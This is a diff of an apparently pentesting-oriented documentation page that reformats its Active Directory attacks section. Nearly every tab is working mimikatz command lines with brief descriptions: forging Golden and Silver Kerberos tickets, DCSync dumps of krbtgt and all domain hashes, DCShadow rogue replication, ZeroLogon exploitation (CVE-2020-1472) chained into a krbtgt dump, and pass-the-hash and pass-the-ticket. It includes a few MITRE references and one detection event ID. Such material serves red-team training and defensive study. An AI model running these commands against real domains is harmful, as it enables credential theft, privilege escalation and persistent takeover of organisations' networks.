@@ -265,97 +265,113 @@ tags:
 ## 🎟️ Active Directory Attacks
 
 <Tabs>
-  <Tab title="Golden Ticket">
-    <Warning>
-      Forges a Kerberos **TGT** using the `krbtgt` account hash. Allows authentication as any user with arbitrary privileges. **MITRE ATT&CK:** [T1558.001](https://attack.mitre.org/techniques/T1558/001)
-    </Warning>
+  <Tab title="Golden Ticket (TGT)">
+    <Danger>
+    Forges a Kerberos **TGT** using the `krbtgt` account hash. Grants persistent domain admin access even if the user's password is changed.
+    **MITRE ATT&CK:** [T1558.001](https://attack.mitre.org/techniques/T1558/001)
+    </Danger>
 
-    <Steps>
-      <Step title="Get Domain SID & krbtgt Hash">
-        ```bash
-        mimikatz # lsadump::trust
-        mimikatz # lsadump::dcsync /user:adolf\krbtgt /csv
-        ```
-      </Step>
-      <Step title="Forge the Golden Ticket">
-        ```bash
-        mimikatz # kerberos::golden /domain:adolf.local /sid:<domainSID> /user:administrator /id:500 /krbtgt:<NTLMhash> /ptt /ticket:C:\Temp\cna_golden
-        ```
-      </Step>
-    </Steps>
+    **Requirements:** Domain FQDN, Domain SID, `krbtgt` hash, Target user RID.
+
+    **1. Get Domain SID & krbtgt Hash:**
+    ```bash
+    mimikatz # lsadump::trust
+    mimikatz # lsadump::dcsync /user:adolf\krbtgt /csv
+    ```
+
+    **2. Create Golden Ticket:**
+    ```bash
+    mimikatz # kerberos::golden /domain:adolf.local /sid:<domainSID> /user:administrator /id:500 /krbtgt:<NTLMhash> /ptt /ticket:C:\Temp\cna_golden
+    ```
   </Tab>
-  <Tab title="Silver Ticket">
+
+  <Tab title="Silver Ticket (TGS)">
     <Warning>
-      Forges a **TGS** for a specific service using the target server’s NTLM hash. Does not interact with the DC.
+    Forges a **TGS** for a specific service using the target server’s NTLM hash. Does not interact with the DC. Very stealthy.
     </Warning>
 
     **Common SPNs:**
-
     | SPN | Service |
-    | --- | --- |
+    |---------|---------|
     | TERMSRV | RDP |
     | CIFS | SMB |
     | WSMAN | WinRM |
     | MSSQL | SQL |
 
-    <Steps>
-      <Step title="Extract Machine Account Hash">
-        ```bash
-        mimikatz # privilege::debug
-        mimikatz # token::elevate
-        mimikatz # lsadump::secrets   # extract $MACHINE.ACC
-        ```
-      </Step>
-      <Step title="Forge Silver Ticket">
-        ```bash
-        mimikatz # kerberos::golden /user:administrator /domain:domain.local /sid:<domainSID> /rc4:<MACHINE_NTLM> /target:hostname.domain.local /service:cifs /ptt
-        ```
-      </Step>
-    </Steps>
+    **1. Extract Machine Account Hash:**
+    ```bash
+    mimikatz # privilege::debug
+    mimikatz # token::elevate
+    mimikatz # lsadump::secrets   # extract $MACHINE.ACC
+    ```
+
+    **2. Forge Silver Ticket:**
+    ```bash
+    mimikatz # kerberos::golden /user:administrator /domain:domain.local /sid:<domainSID> /rc4:<MACHINE_NTLM> /target:hostname.domain.local /service:cifs /ptt
+    ```
   </Tab>
+
   <Tab title="DCSync">
     <Danger>
-      Impersonates a Domain Controller to request account replication data (pulls hashes). **Detection:** Event ID `4662` (Directory Service Access)
+    Impersonates a Domain Controller to request account replication data (pulls hashes).
+    **MITRE ATT&CK:** [T1003.006](https://attack.mitre.org/techniques/T1003/006/) | **Detection:** Event ID `4662`
     </Danger>
 
     ```bash
+    # Dump specific account (e.g., krbtgt)
     mimikatz # lsadump::dcsync /user:krbtgt
+    
+    # Dump all domain users
+    mimikatz # lsadump::dcsync /all
+    
+    # Dump all users in CSV format
     mimikatz # lsadump::dcsync /all /csv
     ```
   </Tab>
-  <Tab title="DCShadow & ZeroLogon">
-    <Danger>
-      **DCShadow:** Registers a rogue DC and pushes malicious replication data. [T1207](https://attack.mitre.org/techniques/T1207)
 
-      ```bash
-      mimikatz # lsadump::dcshadow /stack /object:username /attribute:primaryGroupID /value:512
-      mimikatz # lsadump::dcshadow /push
-      ```
-    </Danger>
-
-    <Callout type="error">
-      **ZeroLogon:** Critical Netlogon cryptographic flaw allowing DC impersonation.
-
-      ```bash
-      mimikatz # lsadump::zerologon /target:hostname.domain.local /account:hostname$ /null /ntlm /exploit
-      ```
-    </Callout>
-  </Tab>
-  <Tab title="PTH & PTT">
-    **Pass-The-Hash (PTH)**
+  <Tab title="DCShadow">
+    <Warning>
+    **DCShadow** registers a rogue DC and pushes malicious replication data. It injects and replicates modified objects into the directory.
+    **MITRE ATT&CK:** [T1207](https://attack.mitre.org/techniques/T1207)
+    </Warning>
 
     ```bash
+    # 1. Prepare attribute changes (Stack)
+    mimikatz # lsadump::dcshadow /stack /object:username /attribute:primaryGroupID /value:512
+    
+    # 2. Push changes to the Domain Controller
+    mimikatz # lsadump::dcshadow /push
+    ```
+  </Tab>
+
+  <Tab title="ZeroLogon">
+    <Danger>
+    **ZeroLogon** is a critical vulnerability (CVE-2020-1472) in the Netlogon authentication protocol used by Windows Domain Controllers. An attacker within the network can impersonate a domain-joined computer — including the Domain Controller itself — by setting the machine account password to null.
+    </Danger>
+
+    ```bash
+    # 1. Exploit the Netlogon flaw and set DC password to null
+    mimikatz # lsadump::zerologon /target:hostname.domain.local /account:hostname$ /null /ntlm /exploit
+
+    # 2. Use the obtained DC authentication to perform DCSync and dump krbtgt
+    mimikatz # lsadump::dcsync /domain:domain.local /dc:hostname.domain.local /user:krbtgt /auth:hostname$ /authdomain:domain.local /authpassword:"" /authntlm
+    ```
+  </Tab>
+
+  <Tab title="PTH & PTT">
+    **Pass-The-Hash (PTH)**
+    ```bash
+    mimikatz # privilege::debug
     mimikatz # sekurlsa::pth /user:<user> /domain:adolf.local /ntlm:<hash> /run:cmd.exe
     ```
 
-    **Over-Pass-The-Hash (OPTH)** Uses NTLM material to obtain Kerberos tickets.
-
+    **Over-Pass-The-Hash (OPTH)**
+    Uses NTLM material to obtain Kerberos tickets.
     ```bash
     mimikatz # sekurlsa::pth /user:<user> /domain:domain.local /ntlm:<hash>
     ```
 
     **Pass-The-Ticket (PTT)**
-
     ```bash
     mimikatz # kerberos::list /export      # Dump tickets
     mimikatz # kerberos::ptt ticket.kirbi   # Import ticket
